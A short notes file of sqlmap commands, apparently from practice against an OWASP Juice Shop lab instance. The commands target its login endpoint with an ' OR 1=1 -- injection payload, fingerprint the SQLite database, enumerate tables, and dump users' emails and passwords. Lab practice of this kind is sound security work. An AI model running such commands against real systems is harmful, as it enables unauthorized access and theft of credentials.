# SQLMAP commandos

sqlmap -u http://juice.hostdevtest.shop/rest/user/login --data="email='  OR 1=1 --  '" --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='sqlite' --technique=B


sqlmap -u http://juice.hostdevtest.shop/rest/user/login --data="email=admin@juice-sh.op" --level 5 --risk 3 -f --banner --ignore-code 401 --ignore-code 402 --ignore-code 403 --dbms='sqlite'


python3 sqlmap.py -u 'http://juice.hostdevtest.shop/rest/user/login' --data="email=test@test.com&password=test" --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='sqlite' --technique=B

sqlmap -u http://juice.hostdevtest.shop/rest/user/login/index.php?id=1 --data="bender@juice-sh.op--" --ignore-code 401 --level 5 --dbms='sqlite'

sqlmap -u http://juice.hostdevtest.shop/rest/user/login --data="email=test@test.com&password=test" --level 5 --risk 3 -f --banner --ignore-code 401 --dbms=sqlite --tables --technique=B --batch 

sqlmap -u http://juice.hostdevtest.shop/rest/user/login/ --data="email=test@test.com&password=test" --level 5 --risk 3 -f --banner --ignore-code 401 --dbms=sqlite -T Users -C email,password --dump --technique=B --batch 